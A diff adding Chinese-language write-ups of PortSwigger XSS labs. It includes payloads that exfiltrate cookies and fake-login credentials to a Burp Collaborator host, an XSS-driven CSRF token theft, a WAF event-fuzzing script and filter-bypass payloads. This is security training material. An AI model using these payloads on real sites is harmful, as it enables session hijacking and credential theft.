@@ -457,3 +457,320 @@ function escapeHTML(html) {
 ```
 <> <img src=1 onerror=alert(1)>
 ```
+
+## [Lab: Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies)
+### 題目敘述
+ This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim. 
+### 題目解釋
+XSS 偷餅乾
+
+### 解答
+
+```
+<img src="1" onerror="console.log(1)">
+```
+可以順利 XSS
+
+```
+<img src=1 onerror="new Image().src='http://moe22y1n6clplh2d0x7lk0n77ydo1d.burpcollaborator.net/'+document.cookie">
+```
+
+然後就收到了
+
+```
+GET /secret=KCTBgYavdncSXqcoqyz4NuDQQU4vkvSk;%20session=xE877pqOmN764sEi7mQ1qJ6cwoF7Z2Ck HTTP/1.1
+```
+
+手動用 F12 把 session 加進去餅乾就過關了
+
+## [Lab: Exploiting cross-site scripting to capture passwords](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-capturing-passwords)
+### 題目敘述
+ This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's username and password then use these credentials to log in to the victim's account. 
+### 題目解釋
+Local 用 XSS 釣魚
+### 解答
+我覺得這題題目沒有講清楚，主要是被害者看到框框就會填帳密，所以做一個假的登入騙他打字
+```
+<input name="username">
+<input name="password" type="password" onchange="new Image().src='http://alzsr5jhuaor5hw6e594b7qaq1wrkg.burpcollaborator.net/'+(document.getElementsByName('username')[0].value + ':' + document.getElementsByName('password')[0].value)">
+```
+
+就會收到
+
+```
+GET /administrator:xqrn0yctmig5fqpgsqcy HTTP/1.1
+```
+
+然後用這組帳密登入即可
+
+
+
+## [Lab: Exploiting XSS to perform CSRF](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-perform-csrf)
+### 題目敘述
+ This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to perform a CSRF attack and change the email address of someone who views the blog post comments.
+
+You can log in to your own account using the following credentials: wiener:peter 
+### 題目解釋
+CSRF 先偷 Token 再送資料
+
+### 解答
+
+我自己需要變更時，需要 Post 到
+```
+POST /my-account/change-email
+
+email=aaa%40ccc.ddd&csrf=fEKGXh3N8B3D9XmgCwLwq9tqbNnH7nTT
+```
+
+所以基本上我們只需要
+
+```
+<form id="myForm" name="myForm" action="/my-account/change-email" method="POST">
+<input type=hidden name="email" id="email" value="meow@meow.meow"/>
+<input type=hidden name="csrf" id="csrf" value="fEKGXh3N8B3D9XmgCwLwq9tqbNnH7nTT"/>
+<input type=hidden name="submit" id="submit" value="submit"/>
+<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
+```
+
+這樣就能自動送了，不過還有一個問題是我們要想辦法取得被害者的 CSRF Token
+
+最終 Payload
+```html
+<script>
+function post_data(csrf_token){
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", '/my-account/change-email', true);
+    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+    xhr.send("email=meow1%40meow.meow&csrf="+csrf_token);
+}
+
+function get_csrf() {
+    var re = /[A-Za-z0-9]{32}/g;
+    csrf_token = this.responseText.match(re)[0];
+    post_data(csrf_token);
+}
+
+var get_csrf_request = new XMLHttpRequest();
+get_csrf_request.addEventListener("load", get_csrf);
+get_csrf_request.open("GET", "https://acd81f291fcc2d2ac06f2bb30025003d.web-security-academy.net/my-account");
+get_csrf_request.send();
+</script>
+
+```
+## [Lab: Reflected XSS into HTML context with most tags and attributes blocked](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-most-tags-and-attributes-blocked)
+### 題目敘述
+ This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
+
+To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the print() function. 
+### 題目解釋
+暴力猜 WAF 沒有檔到的東西
+### 解答
+送
+```
+<script>
+<img>
+<html>
+```
+會說 `Tag is not allow`
+
+測了一下發現 `<body>` 可以，但 `onxxx` 的 attribute 又會噴 `Attribute is not allowed`，所以可以直接暴力測
+
+從 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet 複製所有 `events`
+
+```python
+import requests
+
+all_events = """onactivate
+onafterprint
+onafterscriptexecute
+onanimationcancel
+onanimationend
+onanimationiteration
+onanimationstart
+onbeforeactivate
+onbeforecopy
+onbeforecut
+onbeforedeactivate
+onbeforepaste
+onbeforeprint
+onbeforescriptexecute
+onbeforeunload
+onblur
+onclick
+oncontextmenu
+oncopy
+oncut
+ondblclick
+ondeactivate
+ondrag
+ondragend
+ondragenter
+ondragleave
+ondragover
+ondragstart
+ondrop
+onerror
+onfocus
+onfocusin
+onfocusout
+onhashchange
+onkeydown
+onkeypress
+onkeyup
+onload
+onmessage
+onmousedown
+onmouseenter
+onmouseleave
+onmousemove
+onmouseout
+onmouseover
+onmouseup
+onmousewheel
+onpagehide
+onpageshow
+onpaste
+onpointerdown
+onpointerenter
+onpointerleave
+onpointermove
+onpointerout
+onpointerover
+onpointerrawupdate
+onpointerup
+onpopstate
+onresize
+onscroll
+onselectionchange
+onselectstart
+ontouchend
+ontouchmove
+ontouchstart
+ontransitioncancel
+ontransitionend
+ontransitionrun
+ontransitionstart
+onunhandledrejection
+onunload
+onwebkitanimationend
+onwebkitanimationiteration
+onwebkitanimationstart
+onwebkittransitionend
+onwheel
+""".split("\n")
+
+for att in all_events:
+    res = requests.get(f"https://ac8b1fa91f9f0ce0c0611eb500ad00c5.web-security-academy.net/?search=<body {att}>")
+    print(att,res.status_code)
+    if res.status_code != 400:
+        break
+```
+發現 `onresize` 可以用
+
+然後就寫一下 Exploit 就好ㄌ
+```html
+<iframe src="https://ac8b1fa91f9f0ce0c0611eb500ad00c5.web-security-academy.net/?search=%3Cbody%20onresize=print()%3E" width="200" height="200">
+</iframe>
+
+<script>
+    setTimeout(()=>{
+        document.getElementsByTagName("iframe")[0].width=300;
+    },3000);
+</script>
+```
+
+## [Lab: Reflected XSS into HTML context with all tags blocked except custom ones](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-html-context-with-all-standard-tags-blocked)
+### 題目敘述
+ This lab blocks all HTML tags except custom ones.
+
+To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts document.cookie. 
+### 題目解釋
+Custom tag XSS
+
+### 解答
+
+Chrome Only
+```
+<form id="myForm" name="myForm" action="https://acbe1f0f1e18558ac0ee66a900380039.web-security-academy.net/#x" method="GET">
+<input type=hidden name="search" id="search" value="<xss id=x onfocus=alert(document.cookie) tabindex=1>"/>
+<script>document.createElement('form').submit.call(document.getElementById('myForm'))</script>
+```
+
+## [Lab: Reflected XSS with some SVG markup allowed](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-some-svg-markup-allowed)
+
+### 題目敘述
+ This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
+
+To solve the lab, perform a cross-site scripting attack that calls the alert() function. 
+
+### 題目解釋
+svg XSS
+
+### 解答
+先測試確定可以用 `<svg>`
+
+而 svg 有 4 個子 tag, `animate`, `animatemotion`,`animatetransform`, `set`
+
+測了一下
+```
+<svg><animatetransform onbegin=alert(1) attributeName=transform>
+```
+就可以跳 alert 了，但依然無法解，不知道為什麼 QQ
+
+
+用官方解也能跳，但不能解，感覺是題目壞掉了 (2022/2/19)
+```
+"><svg><animatetransform onbegin=alert(1)>
+```
+
+## [Lab: Reflected XSS in canonical link tag](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-canonical-link-tag)
+### 題目敘述
+ This lab reflects user input in a canonical link tag and escapes angle brackets.
+
+To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the alert function.
+
+To assist with your exploit, you can assume that the simulated user will press the following key combinations:
+
+    ALT+SHIFT+X
+    CTRL+ALT+X
+    Alt+X
+
+Please note that the intended solution to this lab is only possible in Chrome. 
+
+### 題目解釋
+不知道 QQ
+
+### 解答
+不知道在幹嘛，這樣就解掉ㄌ，怪
+```
+https://ac501f4c1e11ddbac0d923cd00260062.web-security-academy.net/?%27accesskey=%27x%27onclick=%27alert(1)
+```
+
+## [Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped](https://portswigger.net/web-security/cross-site-scripting/contexts/lab-javascript-string-single-quote-backslash-escaped)
+### 題目敘述
+ This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
+
+To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the alert function. 
+
+### 題目解釋
+
+### 解答
+發現輸入
+```
+GET /?search=123"<script>alert(1)</script>
+```
+
+他會爛掉，直接用我的 `</script>` 閉合掉 script ㄌ
+
+```
+<script>
+var searchTerms = '123"<script>alert(1)</script>
+```
+
+所以我
+
+```
+GET /?search=123"<script>alert(1)</script><script>alert(1)</script> HTTP/1.1
+```
+
+就解了
